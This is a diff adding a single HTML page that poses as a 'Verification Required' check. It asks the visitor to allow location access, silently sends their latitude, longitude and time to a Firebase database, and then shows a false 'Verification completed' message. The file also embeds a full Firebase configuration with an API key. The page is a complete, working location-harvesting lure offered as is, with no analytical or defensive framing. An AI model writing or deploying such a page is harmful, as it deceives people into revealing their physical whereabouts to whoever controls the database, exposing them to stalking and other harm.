@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Location Required</title>
+</head>
+<body style="font-family:sans-serif;text-align:center;margin-top:40px;">
+
+<h2>Verification Required</h2>
+<p>Please allow location access to continue.</p>
+<button onclick="getLocation()">Continue</button>
+
+<script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
+
+<script>
+const firebaseConfig = {
+  apiKey: "AIzaSyD-myAkBLFbPyqIomR02q6iftboysae-wQ",
+  authDomain: "locationxdd.firebaseapp.com",
+  databaseURL: "https://locationxdd-default-rtdb.asia-southeast1.firebasedatabase.app",
+  projectId: "locationxdd",
+  storageBucket: "locationxdd.firebasestorage.app",
+  messagingSenderId: "114480292043",
+  appId: "1:114480292043:web:d143429c68784b0706bb4e"
+};
+
+firebase.initializeApp(firebaseConfig);
+const db = firebase.database();
+
+function getLocation() {
+  navigator.geolocation.getCurrentPosition(function(position) {
+    db.ref("locations").push({
+      latitude: position.coords.latitude,
+      longitude: position.coords.longitude,
+      time: new Date().toString()
+    });
+
+    alert("Verification completed.");
+  });
+}
+</script>
+
+</body>
+</html>
